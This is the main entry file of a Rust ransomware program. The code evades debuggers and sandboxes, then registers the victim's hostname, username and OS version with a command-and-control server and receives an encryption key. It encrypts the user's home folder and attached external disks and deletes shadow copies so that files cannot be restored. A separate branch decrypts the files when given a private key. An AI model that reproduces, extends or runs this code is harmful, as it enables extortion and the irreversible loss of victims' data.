mod c2;
mod encryption;
mod system;
use serde_json::json;
use std::{env, process::exit, fs::read_to_string};

#[tokio::main]
async fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        if !system::sandbox::is_debugger_detected() && !system::sandbox::is_sandbox_detected() {
            let c2 = c2::api::C2API::new();
            let body = json!({
                "versionOS": system::info::get_version(),
                "host": system::info::get_hostname(),
                "hookUser": system::info::get_username(),
            });

            let api_res = c2.post(&body, "agent/new").await;
            if api_res["data"] == json!({}) {
                println!("Error: {}", api_res["error"]["errorMsg"]);
                exit(-1);
            }
            // Clean received public key
            let private_public_key = api_res["data"]["publicKey"]
                .to_string()
                .replace("\\n", "\n")
                .replace("\"", "");

            encryption::file::multi_threaded_encrypt_decrypt_files(
                system::info::get_user_home().to_str().unwrap(),
                private_public_key.clone(),
                api_res["data"]["id"].to_string(),
                1,
            );
            encryption::disk::encrypt_decrypt_external_disks(
                private_public_key,
                api_res["data"]["id"].to_string(),
                1,
            );

            system::file::delete_shadow_copies();
        }
    } else {
        let private_key = read_to_string(&args[1][..]).unwrap();
        encryption::file::multi_threaded_encrypt_decrypt_files(
            system::info::get_user_home().to_str().unwrap(),
            private_key.clone(),
            String::from("0"),
            0,
        );
        encryption::disk::encrypt_decrypt_external_disks(
            private_key,
            String::from("0"),
            0,
        );
    }

    exit(0);
}
